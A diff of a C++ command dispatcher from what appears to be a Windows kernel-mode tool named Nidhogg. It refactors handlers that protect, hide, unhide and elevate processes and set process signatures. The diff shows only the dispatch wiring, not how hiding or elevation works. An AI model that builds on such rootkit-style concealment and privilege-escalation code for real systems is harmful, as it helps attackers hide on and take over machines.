@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "ProcessParser.h"
-#include "ProcessUtils.hpp"
+#include "ProcessHandler.h"
 
 ProcessParser::ProcessParser() {
 	this->optionsSize = 7;
@@ -31,7 +31,7 @@ ProcessParser::ProcessParser() {
 * @status	 [NTSTATUS] -- Result of the command.
 */
 NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
-	ProcessSignature signature{};
+	IoctlProcessSignature signature{};
 	NTSTATUS status = STATUS_SUCCESS;
 	ULONG pid = 0;
 
@@ -49,16 +49,11 @@ NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		
-		if (NidhoggProccessUtils->GetProtectedProcessesCount() == MAX_PIDS) {
-			status = STATUS_TOO_MANY_CONTEXT_IDS;
-			break;
-		}
 
-		if (NidhoggProccessUtils->FindProcess(pid))
+		if (NidhoggProcessHandler->FindProcess(pid, ProcessType::Protected))
 			break;
 
-		if (!NidhoggProccessUtils->AddProcess(pid))
+		if (!NidhoggProcessHandler->ProtectProcess(pid))
 			status = STATUS_UNSUCCESSFUL;
 		break;
 	}
@@ -69,34 +64,29 @@ NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			break;
 		}
 
-		if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0) {
-			status = STATUS_NOT_FOUND;
-			break;
-		}
-
-		if (!NidhoggProccessUtils->RemoveProcess(pid))
+		if (!NidhoggProcessHandler->RemoveProcess(pid, ProcessType::Protected))
 			status = STATUS_NOT_FOUND;
 
 		break;
 	}
 	case Options::Clear:
 	{
-		NidhoggProccessUtils->ClearProtectedProcesses();
+		NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
 		break;
 	}
 	case Options::Hide:
 	{
-		status = NidhoggProccessUtils->HideProcess(pid);
+		status = NidhoggProcessHandler->HideProcess(pid);
 		break;
 	}
 	case Options::Unhide:
 	{
-		status = NidhoggProccessUtils->UnhideProcess(pid);
+		status = NidhoggProcessHandler->UnhideProcess(pid);
 		break;
 	}
 	case Options::Elevate:
 	{
-		status = NidhoggProccessUtils->ElevateProcess(pid);
+		status = NidhoggProcessHandler->ElevateProcess(pid);
 		break;
 	}
 	case Options::Signature:
@@ -110,7 +100,7 @@ NTSTATUS ProcessParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggProccessUtils->SetProcessSignature(&signature);
+		status = NidhoggProcessHandler->SetProcessSignature(&signature);
 		break;
 	}
 	default:
